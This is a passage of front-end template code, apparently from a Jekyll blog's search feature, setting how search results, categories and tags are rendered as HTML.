pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
